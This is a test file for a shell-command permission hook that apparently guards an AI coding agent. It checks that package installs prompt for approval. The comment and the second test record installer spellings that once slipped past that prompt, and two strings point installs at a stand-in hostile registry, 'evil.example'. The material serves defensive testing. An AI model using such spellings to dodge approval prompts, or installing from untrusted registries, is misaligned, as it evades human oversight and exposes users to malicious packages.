// 2.4.6: every install that names a package asks. The declared-install skip
// (2.4.3 to 2.4.5) was bypassed in every security review, so it was removed
// on the owner's call, and installer spellings that never asked now do.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { hook, base } from './helpers.mjs';
import { tempRepo } from './verify.test.mjs';
import { installedPackages } from '../cli/lib/hooks.mjs';

const asked = (out) => out?.hookSpecificOutput?.permissionDecision === 'ask';
const names = (cmd) => installedPackages(cmd).map((p) => p.name);

test('an install of a package the repo declares asks', () => {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ dependencies: { react: '^19' } }));
  writeFileSync(join(dir, 'requirements.txt'), 'requests\n');
  g('add', '-A'); g('commit', '-qm', 'pkg');
  hook('session-start', base(dir));
  for (const cmd of ['npm i react', 'pip install requests', 'cd ./web && npm i react 2>&1 | tail -3']) assert.ok(asked(hook('pre-bash', base(dir, { tool_input: { command: cmd } }))), cmd);
  for (const cmd of ['npm ci', 'npm install', 'pip install -r requirements.txt', 'npm test']) assert.equal(hook('pre-bash', base(dir, { tool_input: { command: cmd } })), null, cmd);
});

test('installer spellings that skipped the ask are read', () => {
  for (const [cmd, want] of [
    ['npm in leftpad-xyz', ['leftpad-xyz']], ['npm isntall leftpad-xyz', ['leftpad-xyz']], ['npm -g i leftpad-xyz', ['leftpad-xyz']],
    ['npm --registry=https://evil.example i react', ['react']], ['pnpm --global add leftpad-xyz', ['leftpad-xyz']],
    ['yarn global add leftpad-xyz', ['leftpad-xyz']], ['pip3.14 install leftpad-xyz', ['leftpad-xyz']],
    ['pip3 --index-url=https://evil.example install requests', ['requests']], ['pip --isolated install leftpad-xyz', ['leftpad-xyz']],
    ['npx leftpad-xyz --flag arg', ['leftpad-xyz']], ['npm exec leftpad-xyz', ['leftpad-xyz']], ['pnpm dlx leftpad-xyz', ['leftpad-xyz']],
    ['uv tool install leftpad-xyz', ['leftpad-xyz']], ['bun a leftpad-xyz', ['leftpad-xyz']], ['composer global require x/y', ['x/y']],
  ]) assert.deepEqual(names(cmd), want, cmd);
  for (const cmd of ['npm run build', 'npm test', 'yarn', 'pnpm install', 'npm run i18n']) assert.deepEqual(names(cmd), [], cmd);
});
